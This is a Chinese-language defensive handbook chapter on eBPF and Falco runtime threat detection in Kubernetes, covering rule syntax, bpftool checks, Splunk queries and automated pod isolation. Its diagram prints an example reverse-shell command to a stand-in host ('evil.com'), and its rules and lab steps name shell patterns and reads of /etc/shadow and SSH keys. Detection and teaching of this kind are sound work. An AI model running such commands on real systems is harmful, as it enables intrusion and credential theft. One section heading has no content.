# 實戰手冊 25.3：雲原生 eBPF 核心級威脅偵測、Falco 運行時防護與容器邊界防禦

## 案發現場破題

在現代雲原生與 Kubernetes（K8s）叢集中，微服務架構具備高彈性與動態生命週期，傳統基於用戶態 DaemonSet 或代理程式（Agent）的監控方式面臨嚴峻挑戰：攻擊者一旦透過應用程式漏洞（如 RCE 或反序列化）攻破容器，即可利用特權掛載、命名空間穿透或關閉日誌進程破壞監控代理。此外，高吞吐量容器環境中傳統 ptrace 或 seccomp 的性能損耗（Context Switch Overhead）往往令人難以接受。

拓展型柏克萊封包過濾器（eBPF, Extended Berkeley Packet Filter）的誕生徹底顛覆了核心可觀測性與安全防禦格局。eBPF 允許防禦程式在無須修改 Linux 核心原始碼或加載不穩定核心模組（LKM）的前提下，以 JIT 安全編譯方式在 Ring 0 核心層安全執行自訂邏輯。CNCF 旗艦開源專案 Falco 正是利用 eBPF 探針（eBPF Probe）直接在核心層掛鉤 `sys_enter` / `sys_exit`，以微秒級延遲捕獲敏感目錄讀取、反向 Shell 拉起、特權容器逃逸與無檔案記憶體執行。身為 DevSecOps 與雲端防禦工程師，必須精通 eBPF 核心架構、Falco 語法體系與運行時動態威脅阻斷。

```
eBPF / Falco 核心層捕獲架構對比：

[容器 Pod 運行時 (用戶態 Container Namespace)]
  攻擊者發動 RCE: sh -c "cat /etc/shadow" 或 "nc -e /bin/sh evil.com 4444"
       │
       ▼ (觸發系統呼叫 Syscall)
+─────────────────────────────────────────────────────────────+
| Linux 核心空間 (Ring 0 Kernel Space)                        |
|                                                             |
|   Syscall Dispatcher (__x64_sys_execve / openat / connect)  |
|            │                                                |
|            ▼                                                |
|   eBPF Probe (Falco 探針 - 經 In-kernel Verifier 安全驗證)  |
|      - 核心層無鎖環形緩衝區 (Perf / Ring Buffer)            |
|      - 低開銷零拷貝 (Zero-Copy) 提取 PID, UID, CGroup,      |

+────────────┼────────────────────────────────────────────────+

  - 條件匹配: container.id != host and proc.name in (nc, ncat, bash)
  - 觸發即時告警 (Alert: Webhook / Slack / SIEM) 或自動化隔離 (gRPC API)
```

## 第一動：eBPF 核心運作架構與安全機制

### 1.1 eBPF 安全模型與驗證器（In-Kernel Verifier）
- **記憶體與運行安全**：為防止核心崩潰（Kernel Panic），任何 eBPF 字節碼在載入前必須通過核心驗證器（Verifier）檢查：
  - 嚴格檢查所有指針存取與邊界（防止越界讀寫）。
  - 禁止未受控的無窮迴圈（必須有確定的跳出條件，保證有限指令上限）。
  - 程式碼只能調用核心允許的特定 Helper Functions（如 `bpf_ktime_get_ns`, `bpf_probe_read`）。
- **JIT（即時編譯）**：通過驗證後，核心將 eBPF 字節碼即時轉譯為本機機械碼（Native x86/ARM Assembly），具備接近原生核心代碼的極致效能。

### 1.2 Falco 雙架構探針：Kernel Module vs Modern eBPF
1. **傳統核心模組探針（falco.ko）**：相容性高，但需要為每台主機的具體 Linux 核心版本編譯 Kernel Headers，可能引入核心污損或崩潰風險。
2. **Modern eBPF 探針（libbpf + CO-RE）**：
   - 採用 **CO-RE（Compile Once - Run Everywhere）** 與 BTF（BPF Type Format）。
   - 一次編譯即可跨不同的 Linux 核心版本運行，無需安裝開發編譯包。
   - 透過 Ring Buffer（取代舊版 Perf Buffer）實現多核無鎖並行傳輸，性能提升 30% 以上。

## 第二動：Falco 規則語言結構與語法要素

### 2.1 規則核心四要素（Rule Schema）
一條合規的 Falco 規則由下列四個核心鍵值構成：
- `rule`：規則唯一名稱。
- `desc`：詳細威脅描述與對應 TTPs。
- `condition`：布林過濾邏輯（使用欄位名稱、巨集 Macro 與清單 List）。
- `output`：告警輸出格式（支援變數動態格式化插值）。
- `priority`：嚴重等級（`EMERGENCY`, `ALERT`, `CRITICAL`, `ERROR`, `WARNING`, `NOTICE`, `INFO`, `DEBUG`）。

### 2.2 核心監控欄位清單（Fields）
- `proc.name`：進程名稱（如 `bash`, `python`）。
- `proc.cmdline`：完整命令列參數。
- `proc.pname`：父進程名稱。
- `container.id`：容器 ID（若為 `host` 代表主機宿主環境，否則為容器內部）。
- `container.name`：K8s 容器名稱。
- `k8s.pod.name`：Kubernetes Pod 名稱。
- `fd.name`：涉及存取之檔案路徑或 Socket 目標。

## 第三動：手動獵捕與鑑識分析（Falco & bpftool）

### 3.1 使用 bpftool 審查主機上運行的 eBPF 程式與 Maps
```bash
# 步驟 1：列出系統當前載入之所有 eBPF 程式
sudo bpftool prog list

# 步驟 2：檢視 Falco 相關探針的類型 (Tracepoint / Kprobe) 與記憶體佔用
sudo bpftool prog show name sys_enter

# 步驟 3：列出核心層 eBPF 環形緩衝區 Maps
sudo bpftool map list
```

### 3.2 啟動與測試 Falco eBPF 探針運行時日誌
```bash
# 使用 modern eBPF 模式啟動 Falco
sudo falco --modern-bpf -c /etc/falco/falco.yaml -r /etc/falco/falco_rules.yaml

# 模擬觸發：在容器內部執行讀取敏感檔案
docker run --rm -it alpine cat /etc/shadow
```

### 3.3 編寫客製化 Falco 規則阻斷容器內反彈 Shell
```yaml
# /etc/falco/rules.d/custom_rules.yaml
- list: shell_binaries
  items: [bash, sh, zsh, ksh, dash]

- macro: container_boundary
  condition: container.id != host

- macro: spawned_process
  condition: evt.type = execve and evt.dir = <

- rule: Reverse_Shell_Spawned_Inside_Container
  desc: "檢測容器內部拉起交互式 Shell 且建立外部 Socket 連線之反彈 Shell 行為"
  condition: container_boundary and spawned_process and proc.name in (shell_binaries) and (proc.cmdline contains "bash -i" or proc.cmdline contains "nc " or proc.cmdline contains "/dev/tcp/")
  output: "CRITICAL: Reverse Shell Detected in Container (user=%user.name pod=%k8s.pod.name container=%container.name cmd=%proc.cmdline fd=%fd.name)"
  priority: CRITICAL
  tags: [container, mitre_execution, T1059]
```

## 第四動：SIEM 關聯規則與雲原生動態告警工程

### 4.1 Splunk 整合 Falco JSON 輸出（告警關聯看板）
在 `falco.yaml` 中配置 `json_output: true` 並透過 Fluentbit / Vector 傳送至 Splunk：
```spl
index=k8s_security sourcetype="falco:json"
| eval priority=lower(priority), container=coalesce('output_fields.container.name', "host")
| search priority IN ("critical", "alert", "emergency")
| stats count min(_time) as first_seen max(_time) as last_seen by rule, output_fields.k8s.pod.name, container, output_fields.proc.cmdline
| eval alert_type="Container Runtime Breach (eBPF Telemetry)"
| table first_seen, rule, output_fields.k8s.pod.name, container, output_fields.proc.cmdline, count
```

### 4.2 Elastic / Sigma 偵測容器內特權目錄掛載與逃逸

## 第五動：企業級防禦硬化與應急響應阻斷

### 5.1 Falco Sidekick + Kubernetes Response Engine 動態阻斷
- 單純告警無法阻止資料損害。透過整合 **FalcoSidekick** 與 **Kubernetes Event-driven Response**（如 Falco Talon / Argo Events）：
  - 當捕獲 `CRITICAL` 告警（如容器內執行挖礦或讀取 `/etc/shadow`）。
  - FalcoSidekick 透過 gRPC 或 Webhook 調用 K8s API：
    1. **隔離 Pod**：立即給受害 Pod 打上標籤 `quarantine=true`，NetworkPolicy 自動切斷該 Pod 所有出入流量。
    2. **終止 Pod**：調用 `delete pod <pod-name> --grace-period=0 --force` 立即驅逐銷毀。

### 5.2 核心層禁止未授權 eBPF 載入（防禦 eBPF Rootkit）
近年攻擊者亦開始撰寫惡意 eBPF 程式（eBPF Rootkit，如 Boopkit）。防禦加固策略：
```bash
# 關閉非特權用戶調用 bpf() 系統呼叫的能力
sudo sysctl -w kernel.unprivileged_bpf_disabled=1

# 固化至系統配置檔
echo "kernel.unprivileged_bpf_disabled = 1" | sudo tee -a /etc/sysctl.d/99-bpf-hardening.conf
```

## 靶場實戰：佈建 Falco 規則並攔截容器內越權讀取

### 實驗目標
在 Kubernetes / Docker 測試環境啟動 Falco，部署一條針對讀取 `/etc/shadow` 或私鑰檔案的自訂規則，並驗證即時告警觸發：

```bash
# 步驟 1：建立測試規則檔 /etc/falco/rules.d/test_rules.yaml
cat << 'EOF' | sudo tee /etc/falco/rules.d/test_rules.yaml
- rule: Unauthorized_Sensitive_File_Read_In_Container
  desc: "容器內部讀取密碼檔案或 SSH 私鑰"
  condition: container.id != host and evt.type in (open, openat) and fd.name in (/etc/shadow, /root/.ssh/id_rsa)
  output: "ALERT: Sensitive credential accessed in container (file=%fd.name cmd=%proc.cmdline container=%container.name)"
  priority: ALERT
EOF

# 步驟 2：重載 Falco 服務
sudo systemctl restart falco

# 步驟 3：在測試容器內發起違規操作
docker run --rm alpine cat /etc/shadow

# 步驟 4：檢查 Falco 日誌確認捕獲
sudo journalctl -u falco -n 10 --no-pager | grep "Sensitive credential accessed"
```
